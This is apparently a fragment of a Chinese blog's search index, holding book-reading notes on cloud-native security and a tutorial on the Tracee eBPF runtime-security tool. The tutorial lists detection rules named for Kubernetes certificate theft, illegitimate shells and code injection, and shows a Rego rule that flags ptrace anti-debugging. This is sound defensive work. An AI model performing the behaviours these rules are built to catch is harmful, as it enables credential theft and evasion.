","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:3:2","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.3.3云原生应用安全 无服务、服务网格等新型微服务体系同样存在各种安全风险，例如，攻击者通过编写一段无服务的代码获得运行无服务容器的Shell权限，进而对容器网络进行渗透。 与云原生应用相关的安全：面向云原生应用的零信任体系、云原生应用的传统安全机制、业务安全和API安全。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:3:3","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.4云原生安全的关键问题 云原生安全与传统以虚拟化安全为主的云计算安全又巨大差别： 容器不是轻量级的虚拟化，容器安全不是轻量级的虚拟化安全。 虚拟化安全关注的是资源，云原生安全关注的是应用。 安全左移是云原生安全的必经之路。 为了加深对这三点的认识，我们需要来回顾云原生安全的关键问题。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:4:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.4.1如何防护短生命周期的容器 容器的生命周期分布呈三种类型：1）虚拟机型；2）原生型；3）编排型；容器安全和虚拟化安全的最大差别看似是隔离技术的强度，但其实应是生命周期，甚至没有之一，因为这会影响到攻防双方的战术偏好。攻击者投入大部分精力去攻击更为持久化的东西，如代码、第三方库、镜像等资产，开发安全和供应链安全将是云原生环境中的重点安全措施。 终端检测与响应（Endpoint Detection and Response, EDR） 用户和实体行为分析（User and Entity Behavior Analytics, UEBA） ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:4:1","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.4.2如何降低安全运营成本 安全的本质在于对抗以及攻防投入产出比的平衡。 攻击容器的代价较高，而收益较小；但对第三方软件库、项目依赖的镜像“投毒”的持久化代价较小，而其收益远高于攻击容器。 Shift Left（安全左移）：将软件的生命周期从左到右展开，即开发、测试、集成、部署、运行阶段，安全左移的含义就是将安全防护从传统运行时运营转向开发侧（从重视运行时安全转向先从开发侧解决最基本和最容易的问题） ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:4:2","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.4.3 DevSecOps 容器技术天然具有的隔离性、运行时环境一致性、镜像仓库等特性直接推动了DevOps的落地。 DevSecOps闭环\" DevSecOps闭环 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:4:3","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.4.4如何实现安全的云原生化 （1）安全架构具备编排能力；（2）容器和宿主机安全：安全特权容器；（3）业务安全：Sidercar安全容器； ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:4:4","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.5云原生安全现状 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:5:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.5.1云原生新范式：Docker+Kubernetes pf-2021-container-security-and-usage-report 镜像安全、配置规范和运行时安全越来越多的受到容器使用者的关注。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:5:1","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.5.2镜像安全问题仍然很突出 Docker Hub上的镜像安全并不理想，有大量的官方镜像存在高危漏洞。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:5:2","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"1.5.3安全配置规范执行和密钥凭证管理不理想 Falco 2 云原生技术 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:5:3","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.1容器技术 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:6:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.1.1容器与虚拟化 容器技术在操作系统层面实现了对计算机系统资源的虚拟化，在操作系统中，通过对CPU、内存和文件系统等资源的隔离、划分和控制，实现进程之间透明的资源使用。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:6:1","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.1.2容器镜像 容器镜像不是一个文件，是分层存储的文件系统。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:6:2","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.1.3容器存储 镜像元数据 存储驱动 数据卷 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:6:3","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.1.4容器网络 目前容器网络可以简单分为主机网络和集群网络，其中主机网络以Docker为例主要分为None网络模式、Bridge网络模式、Host网络模式和Container网络模式。集群网络以Kubernetes为例，Pod作为Kubernetes应用运行的基本单元，每个Pod中包含一个或多个相关的容器，这些容器都会运行在同一个主机中，并且共享相同的网络命名空间和相同的Linux协议栈。集群网络基于Pod主要涉及以下三种通信：同一个Pod内，容器和容器之间的通信；同一个主机内不同Pod之间的通信；跨主机Pod之间的通信。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:6:4","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.1.5容器运行时 容器运行时负责管理容器运行的整个生命周期，包括但不限于指定容器镜像格式、构建镜像、上传和拉取镜像、管理镜像、管理容器实例、运行容器等。 https://opencontainers.org/ https://github.com/opencontainers https://github.com/opencontainers/runtime-spec https://github.com/opencontainers/image-spec https://kubernetes.io/zh/docs/setup/production-environment/container-runtimes/ ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:6:5","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.2容器编排 当前关注度和使用率比较高的几种容器编排平台主要包括Kubernetes、Apache Mesos、Docker Swarm OpenShift、Rancher等，Kubernetes在容器编排领域占据较大优势。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:7:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.3微服务 Martin Fowler对微服务概念的定义如下：微服务就是将一个完整应用中所有的模块拆分成多个不同的服务，其中每个服务都可以独立部署、维护和扩展，服务之间通常通过 RESTful API 通信，这些服务围绕业务能力构建，且每个服务均可使用不同的编程语言和不同的数据存储技术。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:8:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.4服务网格（Service Mesh） 服务网格通常通过一组轻量级网络代理实现，这些代理与应用程序一起部署，而无须感知应用程序本身。 Service Mesh Architecture\" Service Mesh Architecture ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:9:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.5 Serverless Goals：业务逻辑实现与基础设施分离 Serverless 可在不考虑服务器的情况下构建并允许应用程序和服务，它使开发者避免了基础设施管理，如集群配置、漏洞修补、系统维护等。 Serverless通常可分为两种实现方式，即BaaS（Backend as a Service, 后端即服务）和FaaS（Function as a Service, 函数即服务），其中FaaS是Serverless的主要实现方式。 ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:10:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"2.6 DevOps DevOps Process\" DevOps Process 作者认为 DevOps 成为云原生基础不可或缺的一环，究其根本原因，有以下几点， 云原生提供DevOps基础设施 微服务架构加速DevOps的应用 DevOps赋能服务网格 DevOps加速Serverless应用迁移 References https://blog.container-solutions.com/linux-capabilities-in-practice https://www.cnblogs.com/sparkdev/p/8359028.html https://kubernetes.io/zh/docs/tutorials/clusters/seccomp/ https://en.wikipedia.org/wiki/Seccomp https://grpc.io/ https://katacontainers.io/ https://opencontainers.org/ https://man7.org/linux/man-pages/ https://github.com/cloud-hypervisor/cloud-hypervisor#1-what-is-cloud-hypervisor ","date":"2022-09-07","objectID":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/:11:0","tags":["Cloud Native Security","Book Reading Notes"],"title":"云原生安全：攻防实践与体系构建阅读笔记","uri":"/2022-09-08-%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8-%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BD%93%E7%B3%BB%E6%9E%84%E5%BB%BA/"},{"categories":null,"content":"项目仓库地址：https://github.com/aquasecurity/tracee ","date":"2022-09-05","objectID":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/:0:0","tags":["eBPF","OpenSource Project","Security Issues"],"title":"Tracee 漫游指北","uri":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/"},{"categories":null,"content":"前言 这段时间准备看看开源世界中安全平台层面的产品以及主机安全、运行时安全等技术现阶段业界的实现，为即将到来的毕业设计或论文作准备。eBPF 技术仍是目前我最为看好的云原生世界可观测性、网络以及安全领域最为强有力的技术解决方案，许多老牌的云原生开源项目也都基于 eBPF 提出了一系列 proposals 用于改进产品性能，增强功能性。基于 eBPF 技术构建的 Cilium 也于 2021 年 10 月 13 日 成为了 CNCF 的孵化项目，受到开源社区较大的关注。 也许会写一系列文章来介绍相关的开源项目及其产品设计思路，主要的角度应该是从功能性、架构设计、以及技术选型出发探究这些优秀开源作品的底层设计逻辑，从中窥探目前业界技术、架构发展的趋势。至于编码层面的细节可能只会稍微提一提有意思的设计，重心还是会放在技术应用于产品上对某一揽子问题的通用解决思路。 从目前收集到的信息来看，使用 Go 作为主要编程语言的相关开源项目有， Tracee Tetragon Cilium ","date":"2022-09-05","objectID":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/:0:1","tags":["eBPF","OpenSource Project","Security Issues"],"title":"Tracee 漫游指北","uri":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/"},{"categories":null,"content":"Tracee 项目简介 Tracee 是一个使用 eBPF 技术构建的运行时安全与取证项目，其主要由以下两部分组件构成， （1） Tracee-eBPF 使用 eBPF 技术向内核插入探针捕获内核层面发生的事件，并将这些受到用户关注的内核事件信息通过 BPF Maps 传递至用户态形成事件流，告知用户当前内核层面正在发生什么，是整个项目的数据来源。 （2） Tracee-Rules 是一个运行时安全检测引擎，其负责分析 Tracee-eBPF 提交上来的事件流，从而判断在当前安全上下文环境中是否有异常行为发生，通过自定义或内置的规则（Signature/Rules) 产生实时告警，以告知管理员潜在的安全威胁。 ","date":"2022-09-05","objectID":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/:0:2","tags":["eBPF","OpenSource Project","Security Issues"],"title":"Tracee 漫游指北","uri":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/"},{"categories":null,"content":"Tracee QuickStart 根据 官方文档，我们可以使用 Docker 快速部署 Tracee 项目，提供内核层面的可观测性。不过，在部署之前我们需要确认当前运行的 Linux 系统内核版本是否支持 eBPF 特性以及是否存在 eBPF 程序运行需要确定的内核数据结构文件，相关详情可以参考官方文档的 Prerequisites. 在一切都准备妥当之后，我们便可以使用 Docker 部署 Tracee 项目了，不过为了方便后续介绍 Tracee 的两个重要组件，我们在这里选择使用 分发的 Binary 版本 来进行演示。 在官方项目 repo Releases 页面中下载最新的项目构建版本（笔者当时下载的版本是 v0.8.1），并将压缩包中的内容解压到何时的位置，最终实验环境的目录结构如下， . ├── rules │ ├── anti_debugging_ptraceme.rego │ ├── cgroup_release_agent_modification.rego │ ├── code_injection.rego │ ├── disk_mount.rego │ ├── dropped_executable.rego │ ├── dynamic_code_loading.rego │ ├── fileless_execution.rego │ ├── helpers.rego │ ├── illegitimate_shell.rego │ ├── kernel_module_loading.rego │ ├── kubernetes_certificate_theft_attempt.rego │ ├── ld_preload.rego │ └── syscall_table_hooking.rego ├── tracee.bpf.core.o ├── tracee-ebpf └── tracee-rules rules 文件夹中存放的是 tracee-rules 的内置规则，tracee.bpf.core.o 是经过编译后的一系列 eBPF 探针程序，tracee-ebpf 与 tracee-rules 便是我们上述提到的 tracee 项目中的两大组件。 执行下述命令，我们可以启动 tracee-ebpf 程序进行内核事件捕获并将相关的信息通过 pipe 重定向至 tracee-rules 的输入流中，tracee-rules 通过内置的规则对相关事件流进行研判分析，最终捕获异常事件的执行，在标准输出流中产生告警， sudo ./tracee-ebpf --output format:gob --output option:parse-arguments | ./tracee-rules --input-tracee file:stdin --input-tracee format:gob 我们可以在另外一个 Terminal 中执行 strace ls 命令，跟踪执行 ls 程序时进行的系统调用以及其传入的相关参数。当我们再次回到原先的 Terminal 处时，可以发现在标准输出流中产生了相关的告警， *** Detection *** Time: 2022-09-07T06:25:10Z Signature ID: TRC-2 Signature: Anti-Debugging Data: map[] Command: strace Hostname: {my-hostname} 与该告警相关的描述为， Process uses anti-debugging technique to block debugger 到这我们展示了如何简单地使用 Tracee 进行内核事件监测以及异常行为告警的功能演示。后面的章节中，我们将会继续发掘 tracee-ebpf 的其它功能，在玩耍之中学习该项目的精髓，体会 eBPF 技术带来的强大底层观测以及操控能力。 ","date":"2022-09-05","objectID":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/:0:3","tags":["eBPF","OpenSource Project","Security Issues"],"title":"Tracee 漫游指北","uri":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/"},{"categories":null,"content":"Tracee-ebpf 组件初体验 tracee-ebpf 在 Tracee 项目中扮演了信息收集者的角色，通过向值得关注的内核函数或事件中插入预定义的探针，收集相关的上下文信息，并最终通过 BPF Maps 将信息汇总至用户态 Go 程序，为用户展示了内核世界发生的图景。 下图展示了整个 Tracee 项目的架构, Tracee 项目架构图\" Tracee 项目架构图 其中，左上角部分便是 tracee-ebpf 在项目中的位置，负责内核事件的采集以及通过 BPF Maps 将相关的信息从内核态中传出到用户态。 🌟 Starpoint Tracee 项目中将信息收集的模块与事件分析研判的模块进行了解耦分离，这也是大多是安全平台项目的架构思路。 一整个大的安全体系需要由多个具有不同职责的模块共同工作来进行构建，这其中又无外乎有这么几个抽象的功能点，包括， （1）由某些主体的行为导致的一系列事件的产生，这些事件可能分散于系统的各个部分，发生的时间点也可能有所不同，但他们都是由同一个因导致的。 （2）一个收集的方法，将游离于系统各处（时间和空间上的）的事件进行收集、关联、聚合，成为具有高度上下文语义信息的聚合体。 （3）一个进行分析的方法，有了丰富的上下文环境信息之后，我们需要一个高效的检测方法来识别其中偏离系统基准的行为事件，通俗的来说就是异常事件。 （4）根据检出的异常事件以及当前系统的安全上下文，定义威胁度等级以及相应的行为动作，匹配安全策略。 （5）对进行异常操作的行为主体进行封堵或诱捕，通过预先定义的通知渠道告知相关责任人，最终以求实现安全事件响应处置闭环。 上述每一项功能点都有足够的深度可以进行研究发掘。目前没有来说还没有出现一家独大的场面，各安全厂商也都在积极布局云原生安全，适应这种敏捷轻量的安全体系建设思路。 ✨ tracee-ebpf 命令行工具主要功能介绍 tracee-ebpf 主要的工作为：（1）将预先编译好的 eBPF 程序加载进入内核，对内核事件进行观测；（2）从各种类型的 BPF Maps 中取出事件相关信息，并将数据汇总输出。 tracee-ebpf 目前提供了一些较为简易的 Filters 用于从海量的内核事件中挑选出用户关心的那些事件以及一些敏感的入参。并且，tracee-ebpf 向 Prometheus 暴露了 Metrics 采集接口。用户可以根据需求决定是否需要这些外部功能，这都可以通过向 tracee-ebpf CLI 传入相关参数来决定。 执行以下命令可以追踪以 zsh 为进程名的 execve 的事件， sudo ./tracee-ebpf --trace comm=zsh --trace event=execve 在另外一个终端上随便执行一些命令，再回到原终端，可以看到有如下输出结果， TIME UID COMM PID TID RET EVENT ARGS 17:03:59:874600 1000 zsh 12388 12388 0 execve pathname: /usr/bin/git, argv: [git rev-parse --git-dir] 17:04:01:888219 1000 zsh 12391 12391 0 execve pathname: /usr/bin/git, argv: [clear] 根据需要，我们还能够指定事件输出的格式以及将事件流输出至文件中，进行更加复杂的事件过滤，有兴趣的读者可以自行参考官方文档进行实践。 ","date":"2022-09-05","objectID":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/:0:4","tags":["eBPF","OpenSource Project","Security Issues"],"title":"Tracee 漫游指北","uri":"/2022-09-05-tracee-%E6%BC%AB%E6%B8%B8%E6%8C%87%E5%8C%97/"},{"categories":null,"content":"Tracee-rules 组件初体验 tracee-rules 是一个运行时安全检测引擎，用于从数据源中（目前仅支持 tracee-ebpf）分析是否存在于规则（Signatures）匹配的事件行为，若发现了预定义的异常行为，则会产生告警。当告警发生时可以通过 webhook 触发预先注册的行为事件，例如通过微信告知管理员当前告警信息。 ✨ tracee-rules 用户自定义规则实现 tracee-rules 支持用户自定义规则（Signatures），目前支持以下三种方式： 通过 Golang 编码实现 Signature 接口，用户便可以实现高度定制化的匹配规则与响应逻辑，这也是官方推荐的方式。你也可以使用 Go Plugin 的形式编写 signature，并在程序运行时动态加载，不过这种方式有诸多限制，所以并不被推荐。 通过 Rego 编写定制化的 Signature. 编写的 rule 文件大概长这个样子， package tracee.TRC_2 __rego_metadoc__ := { \"id\": \"TRC-2\", \"version\": \"0.1.0\", \"name\": \"Anti-Debugging\", \"description\": \"Process uses anti-debugging technique to block debugger\", \"tags\": [\"linux\", \"container\"], \"properties\": { \"Severity\": 3, \"MITRE ATT\u0026CK\": \"Defense Evasion: Execution Guardrails\", }, } tracee_selected_events[eventSelector] { eventSelector := { \"source\": \"tracee\", \"name\": \"ptrace\", } } tracee_match { input.eventName == \"ptrace\" arg := input.args[_] arg.name == \"request\" arg.value == \"PTRACE_TRACEME\" } 通过 Go-Cel 编写定制化的 Signature. 需要注意的是这种编写 rules 的方式目前仍然处于 POC (Proof Of Concept) 阶段，是一个实验性的功能，用于有可能需要添加相应的代码段才能够让程序正常识别所编写的 rules，如果你使用 Go-Cel，编写的 rule 文件大概长这个样子， kind:SignaturesConfigapiVersion:tracee.aquasecurity.github.io/v1alpha1signatures:- metadata:id:\"Mine-0.1.0\"version:\"0.1.0\"name:\"My Own Signature\"description:\"My Own Signature Detects 